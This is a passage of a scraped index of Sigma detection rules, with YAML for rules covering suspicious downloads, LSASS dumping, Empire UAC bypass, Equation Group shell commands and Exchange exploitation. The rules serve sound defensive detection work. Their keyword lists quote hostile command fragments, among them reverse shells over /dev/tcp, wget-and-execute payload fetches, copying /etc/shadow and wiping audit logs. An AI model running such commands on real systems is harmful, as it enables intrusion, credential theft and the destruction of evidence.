- cs-ip - c-uri falsepositives: - Software downloads level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1105 - attack.t1568 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_download_susp_dyndns.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1105","attack.t1568"],"title":"Download from Suspicious Dyndns Hosts"},{"categories":null,"contents":"Detects download of certain file types from hosts in suspicious TLDs\nKnown false-positives All kinds of software downloads References https://www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap https://promos.mcafee.com/en-US/PDF/MTMW_Report.pdf https://www.spamhaus.org/statistics/tlds/ https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/ Raw rule (edit) title: Download from Suspicious TLD id: 00d0b5ab-1f55-4120-8e83-487c0a7baf19 status: test description: Detects download of certain file types from hosts in suspicious TLDs author: Florian Roth references: - https://www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap - https://promos.mcafee.com/en-US/PDF/MTMW_Report.pdf - https://www.spamhaus.org/statistics/tlds/ - https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/ date: 2017/11/07 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - \u0026#39;exe\u0026#39; - \u0026#39;vbs\u0026#39; - \u0026#39;bat\u0026#39; - \u0026#39;rar\u0026#39; - \u0026#39;ps1\u0026#39; - \u0026#39;doc\u0026#39; - \u0026#39;docm\u0026#39; - \u0026#39;xls\u0026#39; - \u0026#39;xlsm\u0026#39; - \u0026#39;pptm\u0026#39; - \u0026#39;rtf\u0026#39; - \u0026#39;hta\u0026#39; - \u0026#39;dll\u0026#39; - \u0026#39;ws\u0026#39; - \u0026#39;wsf\u0026#39; - \u0026#39;sct\u0026#39; - \u0026#39;zip\u0026#39; # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/ r-dns|endswith: # Symantec / Chris Larsen analysis - \u0026#39;.country\u0026#39; - \u0026#39;.stream\u0026#39; - \u0026#39;.gdn\u0026#39; - \u0026#39;.mom\u0026#39; - \u0026#39;.xin\u0026#39; - \u0026#39;.kim\u0026#39; - \u0026#39;.men\u0026#39; - \u0026#39;.loan\u0026#39; - \u0026#39;.download\u0026#39; - \u0026#39;.racing\u0026#39; - \u0026#39;.online\u0026#39; - \u0026#39;.science\u0026#39; - \u0026#39;.ren\u0026#39; - \u0026#39;.gb\u0026#39; - \u0026#39;.win\u0026#39; - \u0026#39;.top\u0026#39; - \u0026#39;.review\u0026#39; - \u0026#39;.vip\u0026#39; - \u0026#39;.party\u0026#39; - \u0026#39;.tech\u0026#39; - \u0026#39;.xyz\u0026#39; - \u0026#39;.date\u0026#39; - \u0026#39;.faith\u0026#39; - \u0026#39;.zip\u0026#39; - \u0026#39;.cricket\u0026#39; - \u0026#39;.space\u0026#39; # McAfee report - \u0026#39;.info\u0026#39; - \u0026#39;.vn\u0026#39; - \u0026#39;.cm\u0026#39; - \u0026#39;.am\u0026#39; - \u0026#39;.cc\u0026#39; - \u0026#39;.asia\u0026#39; - \u0026#39;.ws\u0026#39; - \u0026#39;.tk\u0026#39; - \u0026#39;.biz\u0026#39; - \u0026#39;.su\u0026#39; - \u0026#39;.st\u0026#39; - \u0026#39;.ro\u0026#39; - \u0026#39;.ge\u0026#39; - \u0026#39;.ms\u0026#39; - \u0026#39;.pk\u0026#39; - \u0026#39;.nu\u0026#39; - \u0026#39;.me\u0026#39; - \u0026#39;.ph\u0026#39; - \u0026#39;.to\u0026#39; - \u0026#39;.tt\u0026#39; - \u0026#39;.name\u0026#39; - \u0026#39;.tv\u0026#39; - \u0026#39;.kz\u0026#39; - \u0026#39;.tc\u0026#39; - \u0026#39;.mobi\u0026#39; # Spamhaus - \u0026#39;.study\u0026#39; - \u0026#39;.click\u0026#39; - \u0026#39;.link\u0026#39; - \u0026#39;.trade\u0026#39; - \u0026#39;.accountant\u0026#39; # Spamhaus 2018 https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/ - \u0026#39;.cf\u0026#39; - \u0026#39;.gq\u0026#39; - \u0026#39;.ml\u0026#39; - \u0026#39;.ga\u0026#39; # Custom - \u0026#39;.pw\u0026#39; condition: selection fields: - ClientIP - c-uri falsepositives: - All kinds of software downloads level: low tags: - attack.initial_access - attack.t1566 - attack.execution - attack.t1203 - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_download_susp_tlds_blacklist.yml/","tags":["attack.initial_access","attack.t1566","attack.execution","attack.t1203","attack.t1204.002"],"title":"Download from Suspicious TLD"},{"categories":null,"contents":"Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS\nKnown false-positives unknown References https://pentestlab.blog/2020/02/10/credential-access-password-filter-dll/ https://github.com/3gstudent/PasswordFilter/tree/master/PasswordFilter Raw rule (edit) title: Dropping Of Password Filter DLL id: b7966f4a-b333-455b-8370-8ca53c229762 description: Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS status: experimental author: Sreeman date: 2020/10/29 modified: 2021/06/11 references: - https://pentestlab.blog/2020/02/10/credential-access-password-filter-dll/ - https://github.com/3gstudent/PasswordFilter/tree/master/PasswordFilter tags: - attack.credential_access - attack.t1556.002 logsource: category: process_creation product: windows detection: selection_cmdline: CommandLine|contains|all: - \u0026#39;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\u0026#39; - \u0026#39;scecli\\0*\u0026#39; - \u0026#39;reg add\u0026#39; condition: selection_cmdline falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_credential_access_via_password_filter.yml/","tags":["attack.credential_access","attack.t1556.002"],"title":"Dropping Of Password Filter DLL"},{"categories":null,"contents":"Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory\nKnown false-positives Very unlikely References https://github.com/outflanknl/Dumpert https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/ Raw rule (edit) title: Dumpert Process Dumper id: 2704ab9e-afe2-4854-a3b1-0c0706d03578 status: experimental description: Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory author: Florian Roth references: - https://github.com/outflanknl/Dumpert - https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/ date: 2020/02/04 modified: 2021/12/08 tags: - attack.credential_access - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: Hashes|contains: \u0026#39;09D278F9DE118EF09163C6140255C690\u0026#39; condition: selection falsepositives: - Very unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_dumpert.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Dumpert Process Dumper"},{"categories":null,"contents":"Detects process dump via legitimate sqldumper.exe binary\nKnown false-positives Legitimate MSSQL Server actions References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml https://twitter.com/countuponsec/status/910977826853068800 https://twitter.com/countuponsec/status/910969424215232518 https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/ Raw rule (edit) title: Dumping Process via Sqldumper.exe id: 23ceaf5c-b6f1-4a32-8559-f2ff734be516 status: test description: Detects process dump via legitimate sqldumper.exe binary author: Kirill Kiryanov, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml - https://twitter.com/countuponsec/status/910977826853068800 - https://twitter.com/countuponsec/status/910969424215232518 - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/ date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\sqldumper.exe\u0026#39; CommandLine|contains: - \u0026#39;0x0110\u0026#39; - \u0026#39;0x01100:40\u0026#39; condition: selection falsepositives: - Legitimate MSSQL Server actions level: medium tags: - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_sqldumper_activity.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Dumping Process via Sqldumper.exe"},{"categories":null,"contents":"Detects the use of the filename DumpStack.log to evade Microsoft Defender\nKnown false-positives Unknown References https://twitter.com/mrd0x/status/1479094189048713219 Raw rule (edit) title: DumpStack.log Defender Evasion id: 4f647cfa-b598-4e12-ad69-c68dd16caef8 status: test description: Detects the use of the filename DumpStack.log to evade Microsoft Defender references: - https://twitter.com/mrd0x/status/1479094189048713219 tags: - attack.defense_evasion author: Florian Roth date: 2022/01/06 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\DumpStack.log\u0026#39; selection_download: CommandLine: \u0026#39; -o DumpStack.log\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_dumpstack_log_evasion.yml/","tags":["attack.defense_evasion"],"title":"DumpStack.log Defender Evasion"},{"categories":null,"contents":"When C# is compiled dynamically, a .cmdline file will be created as a part of the process. Certain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md#atomic-test-2---dynamic-c-compile Raw rule (edit) title: Dynamic C Sharp Compile Artefact id: e4a74e34-ecde-4aab-b2fb-9112dd01aed0 status: experimental description: | When C# is compiled dynamically, a .cmdline file will be created as a part of the process. Certain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md#atomic-test-2---dynamic-c-compile date: 2022/01/09 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;.cmdline\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1027.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_csharp_compile_artefact.yml/","tags":["attack.defense_evasion","attack.t1027.004"],"title":"Dynamic C Sharp Compile Artefact"},{"categories":null,"contents":"Detects the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27\nKnown false-positives Unknown References https://app.any.run/tasks/579e7587-f09d-4aae-8b07-472833262965 https://twitter.com/cyb3rops/status/1168863899531132929 Raw rule (edit) title: Emissary Panda Malware SLLauncher id: 9aa01d62-7667-4d3b-acb8-8cb5103e2014 status: test description: Detects the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27 author: Florian Roth references: - https://app.any.run/tasks/579e7587-f09d-4aae-8b07-472833262965 - https://twitter.com/cyb3rops/status/1168863899531132929 date: 2018/09/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\sllauncher.exe\u0026#39; Image|endswith: \u0026#39;\\svchost.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_emissarypanda_sep19.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"Emissary Panda Malware SLLauncher"},{"categories":null,"contents":"Detects EmpireMonkey APT reported Activity\nKnown false-positives Very Unlikely References https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b Raw rule (edit) title: Empire Monkey id: 10152a7b-b566-438f-a33c-390b607d1c8d status: test description: Detects EmpireMonkey APT reported Activity author: Markus Neis references: - https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b date: 2019/04/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_cutil: CommandLine|endswith: \u0026#39;/i:%APPDATA%\\logs.txt scrobj.dll\u0026#39; Image|endswith: \u0026#39;\\cutil.exe\u0026#39; selection_regsvr32: CommandLine|endswith: \u0026#39;/i:%APPDATA%\\logs.txt scrobj.dll\u0026#39; Description: \u0026#39;Microsoft(C) Registerserver\u0026#39; condition: 1 of selection* falsepositives: - Very Unlikely level: critical tags: - attack.defense_evasion - attack.t1218.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_empiremonkey.yml/","tags":["attack.defense_evasion","attack.t1218.010"],"title":"Empire Monkey"},{"categories":null,"contents":"Detects some Empire PowerShell UAC bypass methods\nKnown false-positives unknown References https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64 https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64 Raw rule (edit) title: Empire PowerShell UAC Bypass id: 3268b746-88d8-4cd3-bffc-30077d02c787 status: test description: Detects some Empire PowerShell UAC bypass methods author: Ecco references: - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64 - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64 date: 2019/08/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39; -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)\u0026#39; - \u0026#39; -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_empire_uac_bypass.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","car.2019-04-001"],"title":"Empire PowerShell UAC Bypass"},{"categories":null,"contents":"Detects suspicious empty user agent strings in proxy logs\nKnown false-positives Unknown References https://twitter.com/Carlos_Perez/status/883455096645931008 Raw rule (edit) title: Empty User Agent id: 21e44d78-95e7-421b-a464-ffd8395659c4 status: test description: Detects suspicious empty user agent strings in proxy logs author: Florian Roth references: - https://twitter.com/Carlos_Perez/status/883455096645931008 date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: # Empty string - as used by Powershell\u0026#39;s (New-Object Net.WebClient).DownloadString c-useragent: \u0026#39;\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_empty_ua.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"Empty User Agent"},{"categories":null,"contents":"Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\nKnown false-positives legitim script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-1---enable-windows-remote-management https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2 Raw rule (edit) title: Enable Windows Remote Management id: 991a9744-f2f0-44f2-bd33-9092eba17dc3 status: experimental description: Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-1---enable-windows-remote-management - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2 author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: \u0026#39;Script block logging must be enabled\u0026#39; detection: selection_cmdlet: ScriptBlockText|contains: \u0026#39;Enable-PSRemoting \u0026#39; condition: selection_cmdlet falsepositives: - legitim script level: medium tags: - attack.lateral_movement - attack.t1021.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_enable_psremoting.yml/","tags":["attack.lateral_movement","attack.t1021.006"],"title":"Enable Windows Remote Management"},{"categories":null,"contents":"Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.\nKnown false-positives Unknown References https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/ Raw rule (edit) title: Enabled User Right in AD to Control User Objects id: 311b6ce2-7890-4383-a8c2-663a9f6b43cd status: test description: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects. author: \u0026#39;@neu5ron\u0026#39; references: - https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/ date: 2017/07/30 modified: 2021/12/02 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : Policy Change \u0026gt; Audit Authorization Policy Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change\u0026#39; detection: selection_base: EventID: 4704 selection_keywords: PrivilegeList|contains: - \u0026#39;SeEnableDelegationPrivilege\u0026#39; condition: all of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_alert_active_directory_user_control.yml/","tags":["attack.persistence","attack.t1098"],"title":"Enabled User Right in AD to Control User Objects"},{"categories":null,"contents":"This rule detects cor_enable_profiling and cor_profiler environment variables being set and configured.\nReferences https://twitter.com/jamieantisocial/status/1304520651248668673 https://www.slideshare.net/JamieWilliams130/started-from-the-bottom-exploiting-data-sources-to-uncover-attck-behaviors https://www.sans.org/cyber-security-summit/archives Raw rule (edit) title: Enabling COR Profiler Environment Variables id: ad89044a-8f49-4673-9a55-cbd88a1b374f status: test description: This rule detects cor_enable_profiling and cor_profiler environment variables being set and configured. author: Jose Rodriguez (@Cyb3rPandaH), OTR (Open Threat Research) references: - https://twitter.com/jamieantisocial/status/1304520651248668673 - https://www.slideshare.net/JamieWilliams130/started-from-the-bottom-exploiting-data-sources-to-uncover-attck-behaviors - https://www.sans.org/cyber-security-summit/archives date: 2020/09/10 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: - \u0026#39;\\COR_ENABLE_PROFILING\u0026#39; - \u0026#39;\\COR_PROFILER\u0026#39; condition: selection level: high tags: - attack.persistence - attack.privilege_escalation - attack.defense_evasion - attack.t1574.012 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_enabling_cor_profiler_env_variables.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.defense_evasion","attack.t1574.012"],"title":"Enabling COR Profiler Environment Variables"},{"categories":null,"contents":"Detects specific combinations of encoding methods in the PowerShell command lines\nKnown false-positives Unlikely References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65 Raw rule (edit) title: Encoded PowerShell Command Line id: cdf05894-89e7-4ead-b2b0-0a5f97a90f2f status: test description: Detects specific combinations of encoding methods in the PowerShell command lines author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65 date: 2020/10/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;char\u0026#39; - \u0026#39;join\u0026#39; selection2: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;ToInt\u0026#39; - \u0026#39;ToDecimal\u0026#39; - \u0026#39;ToByte\u0026#39; - \u0026#39;ToUint\u0026#39; - \u0026#39;ToSingle\u0026#39; - \u0026#39;ToSByte\u0026#39; selection3: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;ToChar\u0026#39; - \u0026#39;ToString\u0026#39; - \u0026#39;String\u0026#39; selection4: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;split\u0026#39; - \u0026#39;join\u0026#39; selection5: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;ForEach\u0026#39; - \u0026#39;Xor\u0026#39; selection6: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;cOnvErTTO-SECUreStRIng\u0026#39; condition: (selection2 and selection3) or selection1 or selection4 or selection5 or selection6 falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_cmdline_specific_comb_methods.yml/","tags":["attack.defense_evasion","attack.t1027","attack.execution","attack.t1059.001"],"title":"Encoded PowerShell Command Line"},{"categories":null,"contents":"Detects suspicious shell commands used in various Equation Group scripts and tools\nKnown false-positives Unknown References https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1 Raw rule (edit) title: Equation Group Indicators id: 41e5c73d-9983-4b69-bd03-e13b67e9623c status: test description: Detects suspicious shell commands used in various Equation Group scripts and tools author: Florian Roth references: - https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1 date: 2017/04/09 modified: 2021/11/27 logsource: product: linux detection: keywords: # evolvingstrategy, elgingamble, estesfox - \u0026#39;chown root*chmod 4777 \u0026#39; - \u0026#39;cp /bin/sh .;chown\u0026#39; # tmpwatch - \u0026#39;chmod 4777 /tmp/.scsi/dev/bin/gsh\u0026#39; - \u0026#39;chown root:root /tmp/.scsi/dev/bin/\u0026#39; # estesfox - \u0026#39;chown root:root x;\u0026#39; # ratload - \u0026#39;/bin/telnet locip locport \u0026lt; /dev/console | /bin/sh\u0026#39; - \u0026#39;/tmp/ratload\u0026#39; # ewok - \u0026#39;ewok -t \u0026#39; # xspy - \u0026#39;xspy -display \u0026#39; # elatedmonkey - \u0026#39;cat \u0026gt; /dev/tcp/127.0.0.1/80 \u0026lt;\u0026lt;END\u0026#39; # ftshell - \u0026#39;rm -f /current/tmp/ftshell.latest\u0026#39; # ghost - \u0026#39;ghost_* -v \u0026#39; # morerats client - \u0026#39; --wipe \u0026gt; /dev/null\u0026#39; # noclient - \u0026#39;ping -c 2 *; grep * /proc/net/arp \u0026gt;/tmp/gx\u0026#39; - \u0026#39;iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;\u0026#39; # auditcleaner - \u0026#39;\u0026gt; /var/log/audit/audit.log; rm -f .\u0026#39; - \u0026#39;cp /var/log/audit/audit.log .tmp\u0026#39; # reverse shell - \u0026#39;sh \u0026gt;/dev/tcp/* \u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#39; # packrat - \u0026#39;ncat -vv -l -p * \u0026lt;\u0026#39; - \u0026#39;nc -vv -l -p * \u0026lt;\u0026#39; # empty bowl - \u0026#39;\u0026lt; /dev/console | uudecode \u0026amp;\u0026amp; uncompress\u0026#39; - \u0026#39;sendmail -osendmail;chmod +x sendmail\u0026#39; # echowrecker - \u0026#39;/usr/bin/wget -O /tmp/a http* \u0026amp;\u0026amp; chmod 755 /tmp/cron\u0026#39; # dubmoat - \u0026#39;chmod 666 /var/run/utmp~\u0026#39; # poptop - \u0026#39;chmod 700 nscd crond\u0026#39; # abopscript - \u0026#39;cp /etc/shadow /tmp/.\u0026#39; # ys - \u0026#39;\u0026lt;/dev/console |uudecode \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; uncompress\u0026#39; # jacktelnet - \u0026#39;chmod 700 jp\u0026amp;\u0026amp;netstat -an|grep\u0026#39; # others - \u0026#39;uudecode \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; uncompress -f * \u0026amp;\u0026amp; chmod 755\u0026#39; - \u0026#39;chmod 700 crond\u0026#39; - \u0026#39;wget http*; chmod +x /tmp/sendmail\u0026#39; - \u0026#39;chmod 700 fp sendmail pt\u0026#39; - \u0026#39;chmod 755 /usr/vmsys/bin/pipe\u0026#39; - \u0026#39;chmod -R 755 /usr/vmsys\u0026#39; - \u0026#39;chmod 755 $opbin/*tunnel\u0026#39; - \u0026#39;chmod 700 sendmail\u0026#39; - \u0026#39;chmod 0700 sendmail\u0026#39; - \u0026#39;/usr/bin/wget http*sendmail;chmod +x sendmail;\u0026#39; - \u0026#39;\u0026amp;\u0026amp; telnet * 2\u0026gt;\u0026amp;1 \u0026lt;/dev/console\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.execution - attack.g0020 - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml/","tags":["attack.execution","attack.g0020","attack.t1059.004"],"title":"Equation Group Indicators"},{"categories":null,"contents":"Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.\nKnown false-positives To be determined References https://twitter.com/vxunderground/status/1423336151860002816 https://attack.mitre.org/software/S0404/ https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/ Raw rule (edit) title: Esentutl Gather Credentials id: 7df1713a-1a5b-4a4b-a071-dc83b144a101 status: experimental author: sam0x90 date: 2021/08/06 description: Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab. references: - https://twitter.com/vxunderground/status/1423336151860002816 - https://attack.mitre.org/software/S0404/ - https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/ tags: - attack.credential_access - attack.t1003 - attack.t1003.003 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;esentutl\u0026#39; - \u0026#39; /p\u0026#39; condition: selection falsepositives: - To be determined level: medium fields: - User - CommandLine - ParentCommandLine - CurrentDirectory ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_esentutl_params.yml/","tags":["attack.credential_access","attack.t1003","attack.t1003.003"],"title":"Esentutl Gather Credentials"},{"categories":null,"contents":"Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\System\\CurrentControlSet\\Services\\VSS\\Diag\\VolSnap\\Volume are captured.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy Raw rule (edit) title: Esentutl Volume Shadow Copy Service Keys id: 5aad0995-46ab-41bd-a9ff-724f41114971 description: Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\VSS\\\\Diag\\\\VolSnap\\\\Volume are captured. status: experimental date: 2020/10/20 modified: 2021/12/08 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.credential_access - attack.t1003.002 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy logsource: category: registry_event product: windows detection: selection: TargetObject|contains: \u0026#39;System\\CurrentControlSet\\Services\\VSS\u0026#39; Image|endswith: \u0026#39;esentutl.exe\u0026#39; # limit esentutl as in references, too many FP to filter filter: TargetObject|contains: \u0026#39;System\\CurrentControlSet\\Services\\VSS\\Start\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_esentutl_volume_shadow_copy_service_keys.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"Esentutl Volume Shadow Copy Service Keys"},{"categories":null,"contents":"Detects activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers\nKnown false-positives Unknown References https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3 https://twitter.com/GadixCRK/status/1369313704869834753?s=20 https://twitter.com/BleepinComputer/status/1372218235949617161 Raw rule (edit) title: Exchange Exploitation Activity id: bbb2dedd-a0e3-46ab-ba6c-6c82ae7a9aa7 description: Detects activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers author: Florian Roth date: 2021/03/09 modified: 2021/03/16 status: experimental references: - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/ - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ - https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3 - https://twitter.com/GadixCRK/status/1369313704869834753?s=20 - https://twitter.com/BleepinComputer/status/1372218235949617161 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;attrib\u0026#39; - \u0026#39; +h \u0026#39; - \u0026#39; +s \u0026#39; - \u0026#39; +r \u0026#39; - \u0026#39;.aspx\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;schtasks\u0026#39; - \u0026#39;VSPerfMon\u0026#39; selection3: CommandLine|contains|all: - \u0026#39;vssadmin list shadows\u0026#39; - \u0026#39;Temp\\__output\u0026#39; selection4: CommandLine|contains: \u0026#39;%TEMP%\\execute.bat\u0026#39; selection5: Image|endswith: \u0026#39;Users\\Public\\opera\\Opera_browser.exe\u0026#39; selection6: Image|endswith: \u0026#39;Opera_browser.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\services.exe\u0026#39; - 